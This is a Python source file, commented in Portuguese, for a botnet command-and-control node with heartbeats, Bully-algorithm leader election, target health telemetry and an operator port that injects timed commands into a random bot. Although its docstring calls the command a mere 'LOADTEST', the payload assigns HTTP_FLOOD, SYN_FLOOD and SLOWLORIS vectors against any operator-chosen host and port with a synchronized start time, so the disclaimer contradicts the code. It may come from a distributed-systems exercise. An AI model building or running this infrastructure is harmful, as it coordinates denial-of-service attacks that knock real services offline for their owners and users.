"""
c2.py — Nó do cluster de Comando & Controle (C2).

Responsabilidades (thread por papel, sem bloquear a escuta):
  1) heartbeat_sender / heartbeat_listener — UDP, detecta líder vivo/morto.
  2) election_listener                     — TCP, implementa o Algoritmo Bully.
  3) telemetry_loop                        — ativa somente no líder; consulta
                                              a saúde do alvo (via LB) a cada 2s.
  4) operator_listener                     — recebe o comando do operador e,
                                              se este nó é líder, empacota o
                                              payload e injeta em um bot
                                              aleatório da botnet (gossip).
  5) status_server                         — HTTP somente-leitura em :9003,
                                              usado pelo dashboard de
                                              observabilidade para consultar
                                              papel/líder atual deste nó.

Variáveis de ambiente:
  NODE_ID   - inteiro único (maior ID = prioridade na eleição)
  PEERS     - "id:host,id:host,..." dos outros nós C2
  BOTS      - "host:port,host:port,..." dos bots de entrada possíveis
  LB_HEALTH_URL - URL do /health a consultar na telemetria (via LB)
  HEARTBEAT_PORT (default 9000/UDP)
  ELECTION_PORT  (default 9001/TCP)
  OPERATOR_PORT  (default 9002/TCP)
  STATUS_PORT    (default 9003/TCP)

NOTA DE ESCOPO: este nó injeta um comando "LOADTEST" (não um comando de ataque
de rede real). O payload é o mesmo tipo de estrutura usada para orquestrar o
disparo sincronizado descrito na especificação, mas os vetores executados
pelos bots estão limitados a geração de carga legítima — ver bot/bot.py e
docs/SAFETY_NOTES.md.
"""
import http.server
import json
import os
import random
import socket
import threading
import time
import uuid

import httpx

NODE_ID = int(os.environ["NODE_ID"])
HEARTBEAT_PORT = int(os.environ.get("HEARTBEAT_PORT", "9000"))
ELECTION_PORT = int(os.environ.get("ELECTION_PORT", "9001"))
OPERATOR_PORT = int(os.environ.get("OPERATOR_PORT", "9002"))
STATUS_PORT = int(os.environ.get("STATUS_PORT", "9003"))
LB_HEALTH_URL = os.environ.get("LB_HEALTH_URL", "http://lb:8080/health")

PEERS = {}  # id -> host
for entry in [e for e in os.environ.get("PEERS", "").split(",") if e]:
    pid, host = entry.split(":")
    PEERS[int(pid)] = host

BOTS = [b for b in os.environ.get("BOTS", "").split(",") if b]

HEARTBEAT_TIMEOUT = 3.0     # s sem pulso do líder -> suspeita de falha
ELECTION_WAIT = 2.0         # s esperando OK antes de virar líder
COORDINATOR_WAIT = 3.0      # s esperando COORDINATOR antes de re-tentar


class C2Node:
    def __init__(self):
        self.role = "FOLLOWER"
        self.leader_id = None
        self.last_heartbeat = {}  # peer_id -> ts
        self.lock = threading.RLock()
        self.election_lock = threading.Lock()
        self.election_in_progress = False
        self.telemetry_started = False

    # ---------------------------------------------------------- heartbeat --
    def heartbeat_sender(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            msg = json.dumps(
                {"type": "HEARTBEAT", "node_id": NODE_ID, "role": self.role, "ts": time.time()}
            ).encode()
            for pid, host in PEERS.items():
                try:
                    sock.sendto(msg, (host, HEARTBEAT_PORT))
                except OSError:
                    pass
            time.sleep(1.0)

    def heartbeat_listener(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", HEARTBEAT_PORT))
        while True:
            data, _ = sock.recvfrom(4096)
            try:
                msg = json.loads(data.decode())
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.last_heartbeat[msg["node_id"]] = time.time()
                if msg.get("role") == "LEADER":
                    self.leader_id = msg["node_id"]

    def failure_detector(self):
        # Eleição inicial: dá tempo dos peers subirem, depois força uma eleição
        # se nenhum COORDINATOR tiver sido visto ainda.
        time.sleep(2.0 + NODE_ID * 0.1)
        with self.lock:
            no_leader_yet = self.leader_id is None
        if no_leader_yet:
            self.start_election()

        while True:
            time.sleep(0.5)
            with self.lock:
                leader = self.leader_id
                last = self.last_heartbeat.get(leader, 0) if leader else 0
            if leader is not None and leader != NODE_ID:
                if time.time() - last > HEARTBEAT_TIMEOUT:
                    print(f"[c2-{NODE_ID}] suspeito: líder {leader} não responde -> iniciando eleição")
                    self.start_election()

    # ----------------------------------------------------------- eleição --
    def start_election(self):
        if not self.election_lock.acquire(blocking=False):
            return  # já há uma eleição em andamento neste nó
        try:
            self.election_in_progress = True
            higher = [pid for pid in PEERS if pid > NODE_ID]
            got_ok = threading.Event()

            def ask(pid):
                try:
                    with socket.create_connection((PEERS[pid], ELECTION_PORT), timeout=1.0) as s:
                        s.sendall(json.dumps({"type": "ELECTION", "from_id": NODE_ID}).encode())
                        s.settimeout(1.0)
                        resp = s.recv(4096)
                        if resp and json.loads(resp.decode()).get("type") == "OK":
                            got_ok.set()
                except (OSError, socket.timeout, json.JSONDecodeError):
                    pass

            threads = [threading.Thread(target=ask, args=(pid,), daemon=True) for pid in higher]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=ELECTION_WAIT)

            if not got_ok.is_set():
                self.become_leader()
            else:
                # alguém maior respondeu; aguarda COORDINATOR, senão tenta de novo
                print(f"[c2-{NODE_ID}] aguardando COORDINATOR de um nó maior...")
                time.sleep(COORDINATOR_WAIT)
                with self.lock:
                    still_no_leader = self.leader_id is None or self.leader_id == NODE_ID and self.role != "LEADER"
                if self.leader_id is None:
                    self.start_election_unsafe_retry()
        finally:
            self.election_in_progress = False
            self.election_lock.release()

    def start_election_unsafe_retry(self):
        # pequena rede de segurança caso o COORDINATOR se perca (UDP/TCP transitório)
        threading.Thread(target=self.start_election, daemon=True).start()

    def become_leader(self):
        with self.lock:
            self.role = "LEADER"
            self.leader_id = NODE_ID
        print(f"[c2-{NODE_ID}] *** virei LÍDER ***")
        for pid, host in PEERS.items():
            if pid < NODE_ID:
                try:
                    with socket.create_connection((host, ELECTION_PORT), timeout=1.0) as s:
                        s.sendall(json.dumps({"type": "COORDINATOR", "leader_id": NODE_ID}).encode())
                except OSError:
                    pass
        if not self.telemetry_started:
            self.telemetry_started = True
            threading.Thread(target=self.telemetry_loop, daemon=True).start()

    def election_listener(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", ELECTION_PORT))
        srv.listen(16)
        while True:
            conn, _ = srv.accept()
            threading.Thread(target=self._handle_election_conn, args=(conn,), daemon=True).start()

    def _handle_election_conn(self, conn):
        with conn:
            try:
                data = conn.recv(4096)
                msg = json.loads(data.decode())
            except (OSError, json.JSONDecodeError):
                return
            if msg.get("type") == "ELECTION":
                j = msg["from_id"]
                if j < NODE_ID:
                    conn.sendall(json.dumps({"type": "OK", "from_id": NODE_ID}).encode())
                    threading.Thread(target=self.start_election, daemon=True).start()
            elif msg.get("type") == "COORDINATOR":
                with self.lock:
                    self.leader_id = msg["leader_id"]
                    self.role = "FOLLOWER" if msg["leader_id"] != NODE_ID else "LEADER"
                print(f"[c2-{NODE_ID}] novo líder reconhecido: {msg['leader_id']}")

    # --------------------------------------------------------- telemetria --
    def telemetry_loop(self):
        with httpx.Client(timeout=2.0) as client:
            while True:
                with self.lock:
                    if self.role != "LEADER":
                        return  # perdi a liderança; encerra esta thread
                try:
                    r = client.get(LB_HEALTH_URL)
                    print(f"[c2-{NODE_ID}][telemetria] {LB_HEALTH_URL} -> {r.status_code} {r.text}")
                except httpx.HTTPError as e:
                    print(f"[c2-{NODE_ID}][telemetria] alvo inacessível: {e}")
                time.sleep(2.0)

    # ------------------------------------------------------------ operador --
    def operator_listener(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", OPERATOR_PORT))
        srv.listen(8)
        while True:
            conn, _ = srv.accept()
            threading.Thread(target=self._handle_operator_conn, args=(conn,), daemon=True).start()

    def _handle_operator_conn(self, conn):
        with conn:
            try:
                line = conn.recv(4096).decode().strip()
            except OSError:
                return
            with self.lock:
                am_leader = self.role == "LEADER"
                leader_id = self.leader_id
            if not am_leader:
                host = PEERS.get(leader_id) if leader_id else None
                conn.sendall(
                    f"NOT_LEADER current_leader={leader_id} host={host}\n".encode()
                )
                return
            # Formato esperado: LOADTEST <target_host> <target_port> <delay_s> <duration_s>
            parts = line.split()
            if len(parts) != 5 or parts[0] != "LOADTEST":
                conn.sendall(b"USAGE: LOADTEST <target_host> <target_port> <delay_s> <duration_s>\n")
                return
            _, target, port, delay, duration = parts
            payload = {
                "msg_id": str(uuid.uuid4()),
                "type": "LOADTEST",
                "target": target,
                "target_port": int(port),
                "execute_at": time.time() + float(delay),
                "duration_s": float(duration),
                "sharding_rules": {"0": "HTTP_FLOOD", "1": "SYN_FLOOD", "2": "SLOWLORIS"},
                "ttl": 6,
                "issued_by": NODE_ID,
            }
            ok = self.inject_command(payload)
            conn.sendall((f"INJECTED msg_id={payload['msg_id']}\n" if ok else "INJECT_FAILED\n").encode())

    def inject_command(self, payload: dict) -> bool:
        if not BOTS:
            print(f"[c2-{NODE_ID}] nenhum bot configurado em BOTS")
            return False
        entry = random.choice(BOTS)
        host, port = entry.split(":")
        try:
            with socket.create_connection((host, int(port)), timeout=2.0) as s:
                s.sendall(json.dumps(payload).encode())
            print(f"[c2-{NODE_ID}] comando injetado em {entry}: {payload['msg_id']}")
            return True
        except OSError as e:
            print(f"[c2-{NODE_ID}] falha ao injetar em {entry}: {e}")
            return False


class StatusHandler(http.server.BaseHTTPRequestHandler):
    """Endpoint HTTP somente-leitura consultado pelo dashboard de
    observabilidade (dashboard/dashboard.py). Não recebe comandos, não
    altera estado — apenas expõe o papel/líder atual deste nó."""

    node_ref: "C2Node | None" = None

    def do_GET(self):
        if self.path != "/status":
            self.send_response(404)
            self.end_headers()
            return
        node = StatusHandler.node_ref
        with node.lock:
            payload = {
                "node_id": NODE_ID,
                "role": node.role,
                "leader_id": node.leader_id,
            }
        body = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass  # silencia o log de acesso padrão no stdout do container


def status_server(node: "C2Node"):
    StatusHandler.node_ref = node
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", STATUS_PORT), StatusHandler)
    srv.serve_forever()


def main():
    node = C2Node()
    threads = [
        threading.Thread(target=node.heartbeat_sender, daemon=True),
        threading.Thread(target=node.heartbeat_listener, daemon=True),
        threading.Thread(target=node.election_listener, daemon=True),
        threading.Thread(target=node.failure_detector, daemon=True),
        threading.Thread(target=node.operator_listener, daemon=True),
        threading.Thread(target=status_server, args=(node,), daemon=True),
    ]
    for t in threads:
        t.start()
    print(f"[c2-{NODE_ID}] nó C2 no ar. peers={PEERS} bots={BOTS}")
    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
